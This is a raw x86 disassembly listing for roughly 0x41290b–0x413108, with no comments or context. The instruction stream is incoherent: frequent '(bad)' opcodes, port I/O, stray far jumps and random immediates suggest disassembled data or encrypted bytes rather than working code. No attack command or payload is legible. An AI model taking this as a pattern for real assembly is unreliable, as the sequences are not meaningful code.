  41290b:	fs push ebp
  41290d:	mov    edi,0xaff1c69e
  412912:	cld    
  412913:	enter  0x74cf,0xa3
  412917:	stos   BYTE PTR es:[edi],al
  412918:	scas   eax,DWORD PTR es:[edi]
  412919:	jo     0x4128a1
  41291b:	lahf   
  41291c:	sub    al,0x81
  41291e:	xchg   edi,eax
  41291f:	mov    ecx,0x8eac52e6
  412924:	inc    ecx
  412925:	cs mov dh,0xeb
  412928:	fucomi st,st(1)
  41292a:	add    BYTE PTR [ebp-0x2f],ah
  41292d:	jle    0x412953
  41292f:	sbb    eax,0xbd8638e
  412934:	ror    DWORD PTR [esp+ebx*1+0x53],cl
  412938:	pop    ds
  412939:	ins    BYTE PTR es:[edi],dx
  41293a:	mov    eax,0x5781123a
  41293f:	js     0x412959
  412941:	rcl    DWORD PTR [esi+esi*4+0x27],0x7c
  412946:	jmp    DWORD PTR es:[ecx+0x18]
  41294a:	mov    esi,0x22fb99b2
  41294f:	outs   dx,DWORD PTR ds:[esi]
  412950:	and    DWORD PTR [edx+0x189ede71],esp
  412956:	rcr    BYTE PTR [ecx-0x67721674],1
  41295c:	pop    esi
  41295d:	leave  
  41295e:	mov    bl,0x7d
  412960:	in     al,dx
  412961:	out    dx,eax
  412962:	mov    bl,0xcd
  412964:	out    0x36,eax
  412966:	pop    esp
  412967:	or     eax,0x561ef8c4
  41296c:	stos   BYTE PTR es:[edi],al
  41296d:	mul    DWORD PTR [eax+0x12]
  412970:	xchg   edi,eax
  412971:	and    ebp,edx
  412973:	rcl    BYTE PTR [ebp-0x46],cl
  412976:	ja     0x412994
  412978:	cs sub edi,eax
  41297b:	sar    DWORD PTR [edx+esi*1+0x44],1
  41297f:	(bad)  
  412980:	stc    
  412981:	lods   al,BYTE PTR ds:[esi]
  412982:	mov    eax,0xd83d83ae
  412987:	mov    edx,0x192b075
  41298c:	pop    edx
  41298d:	out    dx,eax
  41298e:	(bad)  
  41298f:	pop    edx
  412990:	sbb    al,0x7d
  412992:	mov    bl,0x41
  412994:	inc    edi
  412995:	call   0x3c4e2084
  41299a:	imul   edx,DWORD PTR [eax+0x7e689bd],0xfffffff2
  4129a1:	pop    ebx
  4129a2:	push   esi
  4129a3:	jns    0x412953
  4129a5:	das    
  4129a6:	mov    DWORD PTR [ebx],esp
  4129a8:	pop    esi
  4129a9:	fiadd  DWORD PTR [eax-0x7cad204a]
  4129af:	stos   BYTE PTR es:[edi],al
  4129b0:	inc    edx
  4129b1:	pop    eax
  4129b2:	mov    bh,0xd3
  4129b4:	ja     0x412975
  4129b6:	outs   dx,DWORD PTR ds:[esi]
  4129b7:	sahf   
  4129b8:	adc    esp,DWORD PTR [ebp-0x15c40ef1]
  4129be:	xchg   esp,eax
  4129bf:	data16 aas 
  4129c1:	lds    edx,FWORD PTR [esi+0x46]
  4129c4:	rcl    BYTE PTR [ecx-0x24],0x8f
  4129c8:	push   ebp
  4129c9:	in     eax,dx
  4129ca:	mov    DWORD PTR [edi],ebx
  4129cc:	call   0x540d6eca
  4129d1:	pop    edi
  4129d2:	rol    BYTE PTR [esi],cl
  4129d4:	out    0xd3,al
  4129d6:	add    eax,0xfc6787a9
  4129db:	xchg   ebx,eax
  4129dc:	push   esp
  4129dd:	mov    ax,0x6cf
  4129e1:	jmp    0xda5d:0x6631a2b8
  4129e8:	mov    ds:0x6b2dff2e,eax
  4129ed:	and    edx,esi
  4129ef:	dec    ecx
  4129f0:	fist   DWORD PTR [ecx]
  4129f2:	add    al,0xe6
  4129f4:	push   cs
  4129f5:	mov    esp,0x2e1320aa
  4129fa:	dec    edx
  4129fb:	xor    esi,DWORD PTR [esi-0x38]
  4129fe:	sub    edx,DWORD PTR [edx+eax*8+0x69]
  412a02:	aas    
  412a03:	fld    DWORD PTR [ebp+0x3b]
  412a06:	arpl   WORD PTR [esi+ebx*2+0x2f],di
  412a0a:	sahf   
  412a0b:	sub    BYTE PTR [ebx],bh
  412a0d:	xor    ah,bh
  412a0f:	repz push es
  412a11:	sar    esp,1
  412a13:	and    esi,DWORD PTR [ebp+0x25]
  412a16:	cld    
  412a17:	ja     0x4129ed
  412a19:	sbb    ax,0x5e17
  412a1d:	ins    WORD PTR es:[edi],dx
  412a1f:	pop    ebp
  412a20:	push   esp
  412a21:	out    0x38,eax
  412a23:	xor    BYTE PTR [edi+esi*2+0x77],dh
  412a27:	mov    WORD PTR ds:0xc7097c8c,?
  412a2d:	add    ah,BYTE PTR [ebp-0x20]
  412a30:	jg     0x4129fe
  412a32:	or     esp,esp
  412a34:	jge    0x412a0d
  412a36:	inc    ebx
  412a37:	shl    DWORD PTR [esi+0x46e98601],cl
  412a3d:	sub    esi,ebp
  412a3f:	xor    edi,edx
  412a41:	xchg   ecx,eax
  412a42:	ds dec esp
  412a44:	xor    eax,0xad4f8b3c
  412a49:	mov    eax,0xa0178c56
  412a4e:	mov    eax,0xd69c9e20
  412a53:	pop    ebp
  412a54:	cmp    al,al
  412a56:	jnp    0x412aae
  412a58:	call   0x686157ca
  412a5d:	adc    al,0x94
  412a5f:	push   ebp
  412a60:	push   ebx
  412a61:	pushf  
  412a62:	imul   edi,DWORD PTR [esi+0x249dd56f],0x2a
  412a69:	pop    edx
  412a6a:	(bad)  
  412a6b:	das    
  412a6c:	and    eax,0x85d0ff8b
  412a71:	dec    edx
  412a72:	add    eax,0x34becfb3
  412a77:	ds (bad) 
  412a79:	int3   
  412a7a:	out    dx,al
  412a7b:	jno    0x412a01
  412a7d:	inc    edi
  412a7e:	inc    edi
  412a7f:	push   ss
  412a80:	loopne 0x412a35
  412a82:	cmp    eax,0xe6f8e9f9
  412a87:	icebp  
  412a88:	push   ebp
  412a89:	jns    0x412a98
  412a8b:	sub    dl,BYTE PTR [edi+0x618e0be4]
  412a91:	mov    al,0xeb
  412a93:	je     0x412ab8
  412a95:	xchg   ebp,eax
  412a96:	cmp    al,0xed
  412a98:	enter  0x42f,0x3
  412a9c:	sub    esp,DWORD PTR [esi-0x7df0a7a9]
  412aa2:	jne    0x412aed
  412aa4:	lea    ecx,[edx]
  412aa6:	xor    eax,0xb6306470
  412aab:	hlt    
  412aac:	mov    ds:0xb3adb75c,al
  412ab1:	out    0x24,al
  412ab3:	xor    al,ch
  412ab5:	sbb    BYTE PTR [eax-0x35],al
  412ab8:	dec    ebp
  412ab9:	gs jle 0x412b21
  412abc:	hlt    
  412abd:	add    esi,DWORD PTR [ecx]
  412abf:	aam    0x54
  412ac1:	xchg   bh,dh
  412ac3:	pop    ds
  412ac4:	shl    BYTE PTR [ecx-0x6b],1
  412ac7:	dec    ecx
  412ac8:	adc    edi,edx
  412aca:	ss jmp 0x8cca5b3f
  412ad0:	xor    eax,0x5333baf9
  412ad5:	mov    dh,0x45
  412ad7:	in     al,0x1a
  412ad9:	xor    bl,BYTE PTR [edx]
  412adb:	inc    esp
  412adc:	jne    0x412b20
  412ade:	push   es
  412adf:	jmp    0x77aec845
  412ae4:	rcr    BYTE PTR [edi+0x47582655],cl
  412aea:	mov    al,BYTE PTR [ecx+0x73a31c57]
  412af0:	xor    esi,DWORD PTR [ebx]
  412af2:	push   0xaec28e99
  412af7:	into   
  412af8:	cs nop
  412afa:	aam    0x33
  412afc:	push   cs
  412afd:	or     eax,0x865c40d3
  412b02:	mov    edi,0xb91ae0be
  412b07:	ret    
  412b08:	xor    BYTE PTR [ecx],0xfc
  412b0b:	imul   edi,esi,0x52
  412b0e:	ret    
  412b0f:	outs   dx,BYTE PTR ds:[esi]
  412b10:	idiv   DWORD PTR [ebp+0x3dda3f2a]
  412b16:	pop    ds
  412b17:	dec    ebx
  412b18:	call   0xe813:0x78b76ad2
  412b1f:	sub    ch,ah
  412b21:	sbb    al,0x7
  412b23:	and    al,0xfb
  412b25:	and    eax,0x71d6d748
  412b2a:	cmp    ecx,ebp
  412b2c:	lods   al,BYTE PTR ds:[esi]
  412b2d:	hlt    
  412b2e:	push   edi
  412b2f:	cdq    
  412b30:	inc    esi
  412b31:	into   
  412b32:	sti    
  412b33:	hlt    
  412b34:	and    BYTE PTR [ecx+0x6520af8b],bh
  412b3a:	fld    DWORD PTR [eax-0x55]
  412b3d:	push   edi
  412b3e:	scas   al,BYTE PTR es:[edi]
  412b3f:	mov    eax,0x4ab62a2d
  412b44:	daa    
  412b45:	dec    ebp
  412b46:	inc    ebp
  412b47:	not    DWORD PTR [ebx+eiz*4-0xffd9300]
  412b4e:	popf   
  412b4f:	adc    BYTE PTR [ecx-0x53],bl
  412b52:	(bad)  
  412b53:	popf   
  412b54:	jecxz  0x412b83
  412b56:	inc    ebx
  412b57:	scas   al,BYTE PTR es:[edi]
  412b58:	lods   al,BYTE PTR ds:[esi]
  412b59:	mov    al,0xcb
  412b5b:	iret   
  412b5c:	nop
  412b5d:	cmp    ecx,0x75fd7ed2
  412b63:	push   eax
  412b64:	div    DWORD PTR [ebx-0x4ddfab62]
  412b6a:	mov    WORD PTR [edi+0x19445313],ds
  412b70:	in     eax,0xc
  412b72:	mov    BYTE PTR [edx+0x2741af60],dh
  412b78:	xchg   BYTE PTR [ecx],bl
  412b7a:	aas    
  412b7b:	dec    edx
  412b7c:	inc    edx
  412b7d:	sub    eax,0x90b75ced
  412b82:	inc    esi
  412b83:	repz inc ebx
  412b85:	xchg   ebx,eax
  412b86:	aas    
  412b87:	es push eax
  412b89:	push   esp
  412b8a:	out    0xd3,eax
  412b8c:	arpl   sp,bx
  412b8e:	push   edx
  412b8f:	test   BYTE PTR [esi+ebp*1],0xd9
  412b93:	scas   eax,DWORD PTR es:[edi]
  412b94:	and    BYTE PTR [esi],al
  412b96:	sub    ebx,DWORD PTR [edi]
  412b98:	repnz ins DWORD PTR es:[edi],dx
  412b9a:	mov    dh,0x7d
  412b9c:	loopne 0x412be3
  412b9e:	mov    esi,0xfa6f5e5c
  412ba3:	push   esi
  412ba4:	push   ebx
  412ba5:	cmp    ch,cl
  412ba7:	rcr    BYTE PTR [esi-0x10],0xb7
  412bab:	pop    edi
  412bac:	or     eax,0xc32e352a
  412bb1:	push   ebx
  412bb2:	clc    
  412bb3:	test   BYTE PTR [ebx],ah
  412bb5:	inc    ebx
  412bb6:	ins    BYTE PTR es:[edi],dx
  412bb7:	scas   eax,DWORD PTR es:[edi]
  412bb8:	pop    ds
  412bb9:	or     cl,BYTE PTR [edi-0x76366bf]
  412bbf:	adc    dh,ch
  412bc1:	or     eax,0x133d07a2
  412bc6:	lds    edx,FWORD PTR [edi-0x47229113]
  412bcc:	jo     0x412b78
  412bce:	out    0x5,eax
  412bd0:	mov    eax,ds:0xc6042716
  412bd5:	and    bl,ch
  412bd7:	idiv   BYTE PTR [ebx-0x44]
  412bda:	cmove  edx,DWORD PTR [eax+0x19]
  412bde:	pop    es
  412bdf:	jno    0x412b9d
  412be1:	cld    
  412be2:	cs push edx
  412be4:	fisub  WORD PTR [edi+edx*2-0x206a509f]
  412beb:	cmpxchg DWORD PTR [eax+0x63],ecx
  412bef:	pop    ds
  412bf0:	push   esp
  412bf1:	out    0xd4,al
  412bf3:	ror    BYTE PTR [esi],cl
  412bf5:	cwde   
  412bf6:	push   0xffffffc3
  412bf8:	mov    dl,0x7b
  412bfa:	cmp    BYTE PTR [eax+ebx*4+0x5a],bl
  412bfe:	imul   ebx,DWORD PTR [ebp-0x5627ae26],0xd9b3bcdb
  412c08:	mov    WORD PTR ds:0xca712373,ss
  412c0e:	inc    edi
  412c0f:	repnz repz (bad) 
  412c12:	fadd   DWORD PTR [esi+0x37095df4]
  412c18:	add    DWORD PTR [esi+ecx*1+0x2d5eca67],esi
  412c1f:	push   edi
  412c20:	loopne 0x412c6d
  412c22:	enter  0xc07e,0xbb
  412c26:	pushf  
  412c27:	fmul   QWORD PTR [ecx-0x3c]
  412c2a:	retf   
  412c2b:	popa   
  412c2c:	stos   BYTE PTR es:[edi],al
  412c2d:	jl     0x412c52
  412c2f:	loopne 0x412bf9
  412c31:	repz sub eax,0x57079c74
  412c37:	bswap  edi
  412c39:	dec    edx
  412c3a:	cmp    edx,DWORD PTR [esi-0x4f]
  412c3d:	fwait
  412c3e:	nop
  412c3f:	aam    0xaf
  412c41:	stos   DWORD PTR es:[edi],eax
  412c42:	push   esi
  412c43:	sub    ch,ah
  412c45:	pop    ebx
  412c47:	add    BYTE PTR [esi-0x50],bh
  412c4a:	jns    0x412be6
  412c4c:	out    dx,eax
  412c4d:	arpl   si,sp
  412c4f:	mov    esi,0xb4608f
  412c54:	or     al,0x69
  412c56:	mov    eax,0xc9546d6
  412c5b:	cmp    DWORD PTR [esi+0x16],esi
  412c5e:	mov    edi,0x5c40413
  412c63:	in     eax,dx
  412c64:	xor    al,0xb7
  412c66:	sbb    eax,0xcd1929db
  412c6b:	call   DWORD PTR [ecx-0x391b652c]
  412c71:	inc    ebx
  412c72:	scas   eax,DWORD PTR es:[edi]
  412c73:	dec    esp
  412c74:	push   edi
  412c75:	xor    al,0xd0
  412c77:	cmp    al,BYTE PTR [edx]
  412c79:	mov    ah,BYTE PTR [ecx+0x2b9b3b25]
  412c7f:	push   cs
  412c80:	sbb    eax,0xcd7d5f6b
  412c85:	or     ebx,esi
  412c87:	cmp    dl,BYTE PTR [edx]
  412c89:	test   al,0x8b
  412c8b:	inc    ebx
  412c8c:	inc    edi
  412c8d:	add    DWORD PTR [esp+ecx*8+0x52196ecf],esp
  412c94:	sub    al,bh
  412c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c97:	mov    cl,0xe8
  412c99:	xchg   edi,eax
  412c9a:	sti    
  412c9b:	push   ebp
  412c9c:	pop    es
  412c9d:	mov    ebp,0xd16b0d11
  412ca2:	mov    esp,0xc8840d55
  412ca8:	cmp    al,0xa1
  412caa:	push   0x4c
  412cac:	adc    eax,DWORD PTR [ebx]
  412cae:	push   ds
  412caf:	mov    edx,0x6ef558f1
  412cb4:	dec    eax
  412cb5:	retf   
  412cb6:	jns    0x412c4e
  412cb8:	adc    eax,0xf6098d05
  412cbd:	inc    ebp
  412cbf:	add    eax,0x2df4d7ed
  412cc4:	fs sub eax,0xa7484142
  412cca:	or     DWORD PTR [edi],0xffffffec
  412ccd:	mov    ebx,0xef6954a8
  412cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cd3:	xchg   edi,eax
  412cd4:	mov    bl,0xcc
  412cd6:	test   DWORD PTR [eax+edx*4],0x49d7e23c
  412cdd:	sbb    dh,BYTE PTR [ecx+0x4f]
  412ce0:	shl    bl,0xa9
  412ce3:	push   ss
  412ce4:	inc    esp
  412ce5:	loop   0x412c78
  412ce7:	faddp  st(4),st
  412ce9:	add    eax,0x80fc145d
  412cee:	repz or BYTE PTR [ebx],dl
  412cf1:	xor    BYTE PTR [esi],dh
  412cf3:	pusha  
  412cf4:	arpl   WORD PTR [eax+esi*1-0x3c14606],ax
  412cfb:	adc    eax,0x909e633b
  412d00:	retf   
  412d01:	sbb    edi,ebx
  412d03:	xor    eax,0x9f47b164
  412d08:	pushf  
  412d09:	dec    edi
  412d0a:	or     DWORD PTR [edx-0x379555b3],eax
  412d10:	pushf  
  412d11:	mov    esi,0xcc181f66
  412d16:	fmul   st(2),st
  412d18:	jmp    0x45bc:0x8947bf5c
  412d1f:	xchg   edi,eax
  412d20:	dec    ecx
  412d21:	sub    al,BYTE PTR [ebx-0x7b]
  412d24:	out    0x82,eax
  412d26:	push   es
  412d27:	adc    al,0x9
  412d29:	add    al,0x17
  412d2b:	push   esi
  412d2c:	mov    ch,0xee
  412d2e:	sub    al,0xac
  412d30:	lock xor DWORD PTR [ebp-0x74505ea5],esp
  412d37:	data16 shl al,0xf7
  412d3b:	mov    al,ds:0x369c5d6d
  412d40:	imul   DWORD PTR [ebp+edx*2-0xb10dbd1]
  412d47:	mov    bl,0x3b
  412d49:	loopne 0x412d46
  412d4b:	mov    al,0xf8
  412d4d:	outs   dx,BYTE PTR ds:[esi]
  412d4e:	sbb    DWORD PTR [esi+0xa],ebp
  412d51:	ror    BYTE PTR [esi],1
  412d53:	jmp    0x36adca0a
  412d58:	mov    esp,0x372d1374
  412d5d:	sub    ebx,DWORD PTR [eax]
  412d5f:	and    DWORD PTR [eax-0xfa81fc7],0xffffffe8
  412d66:	cmp    BYTE PTR [esi-0x48],ah
  412d69:	mov    fs,esi
  412d6b:	and    ah,BYTE PTR [edi+0x14f397d7]
  412d71:	fisub  WORD PTR [edi+0x22]
  412d74:	cmp    eax,0xd897f87d
  412d79:	adc    eax,0xa87f1d19
  412d7e:	jmp    0x5bd4:0x308f6b0
  412d85:	sbb    eax,0xfac854dc
  412d8a:	out    0xc8,eax
  412d8c:	add    BYTE PTR [ecx-0x70],0x2b
  412d90:	bound  edx,QWORD PTR [ecx+0x3f]
  412d93:	in     eax,0x6e
  412d95:	push   eax
  412d96:	pop    ebp
  412d97:	sbb    edi,DWORD PTR [edx-0x57]
  412d9a:	and    al,0xee
  412d9c:	push   ds
  412d9d:	pop    edi
  412d9e:	mov    edx,0x99320b5e
  412da3:	hlt    
  412da4:	jbe    0x412dfe
  412da6:	repnz test BYTE PTR [edx-0x7b1e74e2],0x66
  412dae:	xchg   DWORD PTR [edx],ecx
  412db0:	scas   al,BYTE PTR es:[edi]
  412db1:	push   ecx
  412db2:	and    al,0xd4
  412db4:	stos   BYTE PTR es:[edi],al
  412db5:	xchg   BYTE PTR [eax+0x74],dh
  412db8:	ja     0x412e14
  412dba:	mov    dl,0x7f
  412dbc:	retf   
  412dbd:	fidiv  WORD PTR [ebx-0x7e187f14]
  412dc3:	adc    al,0xc7
  412dc5:	cmp    DWORD PTR [esi+edx*8-0x7b4dd9f7],edi
  412dcc:	mov    ds:0x1cb56c53,eax
  412dd1:	imul   ecx,DWORD PTR [eax+ebx*1],0x4f
  412dd5:	sub    dl,BYTE PTR [ecx-0x79]
  412dd8:	(bad)  
  412dd9:	aaa    
  412dda:	mov    al,ds:0x7d84d248
  412ddf:	ret    0xdf1
  412de2:	fcom   QWORD PTR [edx]
  412de4:	ss sbb esp,ebx
  412de7:	push   eax
  412de8:	or     ebp,DWORD PTR ds:0x35a933e6
  412dee:	js     0x412db1
  412df0:	into   
  412df1:	xor    al,0xe2
  412df3:	sub    BYTE PTR [ebx-0x24],dl
  412df6:	push   cs
  412df7:	aaa    
  412df8:	call   0x619e:0x6db7e81a
  412dff:	add    eax,DWORD PTR [edi-0x13f93a97]
  412e05:	mov    al,0x2b
  412e07:	mov    al,0x79
  412e09:	push   es
  412e0a:	int3   
  412e0b:	outs   dx,BYTE PTR ds:[esi]
  412e0c:	rcl    DWORD PTR [edi],cl
  412e0e:	cdq    
  412e0f:	mul    ecx
  412e11:	call   0x6d1ed8eb
  412e16:	xabort 0x32
  412e19:	aad    0xdb
  412e1b:	dec    esi
  412e1c:	les    eax,FWORD PTR [edi+eiz*4-0x4c]
  412e20:	xchg   ecx,eax
  412e21:	pop    edi
  412e22:	lea    eax,[eax-0x352da0e3]
  412e28:	mov    ch,BYTE PTR [edi-0x51bb78c6]
  412e2e:	out    dx,al
  412e2f:	jbe    0x412e08
  412e31:	ret    0x221d
  412e34:	adc    ch,BYTE PTR [esi-0x7f0850cf]
  412e3a:	repz inc esp
  412e3c:	cmp    al,BYTE PTR [ecx+0xf]
  412e3f:	lock lods eax,DWORD PTR ds:[esi]
  412e41:	sar    DWORD PTR [eax+edi*2-0x299f8fb7],0x90
  412e49:	xchg   ebp,eax
  412e4a:	xchg   ecx,eax
  412e4b:	mov    eax,ds:0x45179d46
  412e50:	mov    eax,0x9a904bf1
  412e55:	pop    esp
  412e56:	dec    ebp
  412e57:	aas    
  412e58:	dec    ecx
  412e59:	test   eax,0x8a6d8a49
  412e5e:	jecxz  0x412e27
  412e60:	and    BYTE PTR [esi-0x19],al
  412e63:	das    
  412e64:	sub    cl,bh
  412e66:	pop    edx
  412e67:	es mov dl,0xef
  412e6a:	mov    BYTE PTR [ecx-0x45cbff1d],dl
  412e70:	lds    ebx,FWORD PTR [esi+esi*1-0x31466d2]
  412e77:	lea    ebp,[edi-0x417aed58]
  412e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e7e:	jp     0x412e35
  412e80:	retf   0x7d4f
  412e83:	rcl    DWORD PTR [ebx-0x1d17ac7f],1
  412e89:	iret   
  412e8a:	pop    ss
  412e8b:	repz mov al,0x5b
  412e8e:	inc    edi
  412e8f:	jl     0x412e1d
  412e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e92:	lds    esi,FWORD PTR [edx-0x4a]
  412e95:	jns    0x412e79
  412e97:	pushf  
  412e98:	mov    ebx,0xe7a19a00
  412e9d:	mov    esp,0x98a5369b
  412ea2:	arpl   WORD PTR [eax-0x7e37d625],si
  412ea8:	test   dl,0x45
  412eab:	das    
  412eac:	(bad)  
  412ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eae:	repnz or eax,0xb345c335
  412eb4:	cmp    eax,0xa0374c55
  412eba:	call   0x8849:0x4e0e9d44
  412ec1:	repz pop edi
  412ec3:	jle    0x412edd
  412ec5:	lahf   
  412ec6:	rcl    esi,0x94
  412ec9:	inc    edi
  412eca:	sti    
  412ecb:	add    dl,BYTE PTR [ebx-0x210b30aa]
  412ed1:	pop    ds
  412ed2:	inc    ecx
  412ed3:	sbb    bh,BYTE PTR [edi+0x32]
  412ed6:	cmp    edx,DWORD PTR ds:0xb6d5f797
  412edc:	lock call 0x109401f6
  412ee2:	lock (bad) 
  412ee5:	push   ebx
  412ee6:	dec    ebp
  412ee8:	clc    
  412ee9:	pop    esi
  412eea:	mov    bh,0x60
  412eec:	dec    ebp
  412eed:	add    al,BYTE PTR [ebx]
  412eef:	test   DWORD PTR [ebp+0x4f],edi
  412ef2:	into   
  412ef3:	xor    DWORD PTR [ecx-0x11],esi
  412ef6:	adc    al,BYTE PTR [eax-0x13dcd738]
  412efc:	(bad)  
  412efd:	imul   BYTE PTR [edx]
  412eff:	lock mov eax,ds:0x877a79cb
  412f05:	adc    al,0x1
  412f07:	inc    ebp
  412f08:	adc    al,0xb3
  412f0a:	popa   
  412f0b:	sbb    DWORD PTR [edi],edi
  412f0d:	mov    al,0x12
  412f0f:	push   ecx
  412f10:	mov    BYTE PTR [ecx],bh
  412f12:	jl     0x412ede
  412f14:	xchg   esi,ecx
  412f16:	inc    eax
  412f17:	mov    al,0x96
  412f19:	leave  
  412f1a:	jecxz  0x412f2c
  412f1c:	out    dx,al
  412f1d:	fisub  DWORD PTR [esi]
  412f1f:	adc    eax,DWORD PTR [edi-0x51186c0b]
  412f25:	add    eax,0x9a33614b
  412f2a:	ret    0x8a58
  412f2d:	ror    dh,1
  412f2f:	mov    BYTE PTR [ebp+0x26f93dd2],dh
  412f35:	shr    BYTE PTR [ebx],cl
  412f37:	outs   dx,DWORD PTR ds:[esi]
  412f38:	(bad)  
  412f39:	gs mov dl,0x51
  412f3c:	mov    ecx,0xa057f4b
  412f41:	push   eax
  412f42:	adc    ebp,DWORD PTR [ecx-0x48]
  412f45:	mov    ah,al
  412f47:	or     ebp,ebp
  412f49:	ins    BYTE PTR es:[edi],dx
  412f4a:	xor    DWORD PTR [esi-0xa],ecx
  412f4d:	cmp    BYTE PTR [esp+edi*4+0x1b],dl
  412f51:	mov    WORD PTR [ebx-0x32f48522],?
  412f57:	push   0x81c35aed
  412f5c:	cdq    
  412f5d:	test   BYTE PTR [edi+0x49],ah
  412f60:	dec    edx
  412f61:	mov    edi,0x3318f6e3
  412f66:	jmp    0xce35:0x191d2df8
  412f6d:	xchg   edi,eax
  412f6e:	mov    bh,0x13
  412f70:	packssdw mm5,QWORD PTR [edx]
  412f73:	jge    0x412f21
  412f75:	pop    ecx
  412f76:	dec    ecx
  412f77:	scas   al,BYTE PTR es:[edi]
  412f78:	and    dl,cl
  412f7a:	call   0xadd860b7
  412f7f:	xchg   edx,eax
  412f80:	jge    0x412f1c
  412f82:	jns    0x412fda
  412f84:	push   cs
  412f85:	scas   al,BYTE PTR es:[edi]
  412f86:	(bad)  
  412f87:	xchg   ebp,eax
  412f88:	add    BYTE PTR [ebp+0x73],dl
  412f8b:	or     ch,dh
  412f8d:	push   esp
  412f8e:	and    dh,BYTE PTR [edi]
  412f90:	cmp    DWORD PTR [ebp+0x264bf739],0x287715af
  412f9a:	scas   al,BYTE PTR es:[edi]
  412f9b:	add    BYTE PTR [eax+0x14],bl
  412f9e:	add    DWORD PTR [edx+0x4bc06021],edx
  412fa4:	sub    eax,0x2164d8d3
  412fa9:	loope  0x412f63
  412fab:	(bad)  [ebx]
  412fad:	pop    ebx
  412fae:	push   edx
  412faf:	mov    cl,dl
  412fb1:	and    DWORD PTR [edi+0x5b872794],0xfffffff5
  412fb8:	push   ecx
  412fb9:	xchg   esi,eax
  412fba:	hlt    
  412fbb:	not    BYTE PTR [esi+0x761c804a]
  412fc1:	jmp    0x2efa:0x7aa185f0
  412fc8:	jbe    0x412f94
  412fca:	clc    
  412fcb:	lods   al,BYTE PTR ds:[esi]
  412fcc:	or     BYTE PTR [ebp+edi*8+0x0],bl
  412fd0:	lods   al,BYTE PTR ds:[esi]
  412fd1:	pop    es
  412fd2:	pop    sp
  412fd4:	mov    cl,0x3b
  412fd6:	cmp    BYTE PTR [ebx+ebx*8-0x5f66a6a7],0xd6
  412fde:	lods   al,BYTE PTR ds:[esi]
  412fdf:	jmp    0x412fa1
  412fe1:	add    eax,0x6ac24840
  412fe6:	aad    0xe6
  412fe8:	shl    ebp,1
  412fea:	ficomp WORD PTR ss:[ecx]
  412fed:	xchg   ebx,eax
  412fee:	add    eax,0x918b3356
  412ff3:	dec    esi
  412ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff5:	mov    dh,0xde
  412ff7:	jp     0x41300d
  412ff9:	jne    0x412fb5
  412ffb:	in     eax,0xf8
  412ffd:	mov    eax,0x9332e5c
  413002:	arpl   WORD PTR [ebp+edi*8+0x21c4eb32],di
  413009:	pop    edi
  41300a:	dec    edx
  41300b:	out    dx,al
  41300c:	xchg   DWORD PTR [esp+ebp*1-0x74d93a80],esi
  413013:	scas   al,BYTE PTR es:[edi]
  413014:	rcr    bl,cl
  413016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413017:	jne    0x412fa0
  413019:	pop    eax
  41301a:	jne    0x413076
  41301c:	in     al,0x66
  41301e:	sbb    ch,BYTE PTR [edx]
  413020:	call   0xf45c:0x2be3d7e5
  413027:	add    esi,DWORD PTR [edi-0x16b078f9]
  41302d:	sar    BYTE PTR [ecx-0x64d78db4],cl
  413033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413034:	cli    
  413035:	repnz dec ecx
  413037:	add    eax,esp
  413039:	fcomp  QWORD PTR [ebp+ebx*1+0x4b]
  41303d:	adc    ch,BYTE PTR [ecx+ebx*2]
  413040:	jg     0x413010
  413042:	aas    
  413043:	adc    edi,DWORD PTR [edx+0x7ad99495]
  413049:	pop    edx
  41304a:	cmc    
  41304b:	mov    WORD PTR [esi+0x3ad3eaee],gs
  413051:	sub    dh,BYTE PTR [edi+ebx*4+0x44]
  413055:	xor    esp,ebp
  413057:	xchg   esi,eax
  413058:	adc    eax,0xf108125e
  41305d:	sub    BYTE PTR [eax],0xe
  413060:	inc    edx
  413061:	mov    ecx,0x29ee01f6
  413066:	inc    ebx
  413067:	inc    eax
  413068:	punpckhwd mm5,QWORD PTR [eax+0x17]
  41306c:	pushf  
  41306d:	cmp    edi,eax
  41306f:	bound  ecx,QWORD PTR [ebx+edi*8+0x226058e]
  413076:	xor    BYTE PTR [ecx],0xb8
  413079:	jl     0x4130e5
  41307b:	jl     0x41301b
  41307d:	add    DWORD PTR [ebp+0x22],esi
  413080:	or     BYTE PTR [esi+0x6861a9c6],0x1c
  413087:	call   0xafab:0x6dd2d43c
  41308e:	push   ebp
  41308f:	(bad)  
  413090:	adc    DWORD PTR [ebx],esp
  413092:	daa    
  413093:	pop    ss
  413094:	inc    ebx
  413095:	pushf  
  413096:	in     al,0xcf
  413098:	loop   0x4130ef
  41309a:	daa    
  41309b:	pushf  
  41309c:	lock not eax
  41309f:	jge    0x413043
  4130a1:	pop    ss
  4130a2:	push   0x4a3344ab
  4130a7:	mov    bh,0x5b
  4130a9:	rcr    BYTE PTR [ebx+0x75],0xf
  4130ad:	retf   0x52dd
  4130b0:	lahf   
  4130b1:	cld    
  4130b2:	jp     0x413034
  4130b4:	xor    BYTE PTR [esi-0x59247829],dl
  4130ba:	pushf  
  4130bb:	sub    ecx,ebx
  4130bd:	lock jl 0x41309a
  4130c0:	fstp   st(2)
  4130c2:	stc    
  4130c3:	sbb    cl,BYTE PTR [esi+ebx*4+0x2d]
  4130c7:	sub    al,0xec
  4130c9:	inc    edi
  4130ca:	test   edi,edx
  4130cc:	sbb    DWORD PTR [edx],esp
  4130ce:	and    bl,BYTE PTR [ecx*8-0x4ed36938]
  4130d5:	icebp  
  4130d6:	jae    0x41306a
  4130d8:	jb     0x4130ce
  4130da:	pop    ebx
  4130db:	inc    edx
  4130dc:	xor    eax,0x52f03d65
  4130e1:	stos   BYTE PTR es:[edi],al
  4130e2:	outs   dx,BYTE PTR ds:[esi]
  4130e3:	fnsave [ebx-0x677ba1ef]
  4130e9:	pop    esi
  4130ea:	fistp  WORD PTR [esi]
  4130ec:	adc    dl,BYTE PTR [esi+0x6de8519b]
  4130f2:	push   0xffffffb2
  4130f4:	jmp    0x41315f
  4130f6:	les    ecx,FWORD PTR [esi-0x52abcdec]
  4130fc:	sahf   
  4130fd:	sbb    al,dl
  4130ff:	mov    bl,dl
  413101:	sub    eax,DWORD PTR [ebp-0xefc0bf9]
  413107:	retf   
  413108:	fs pop esi
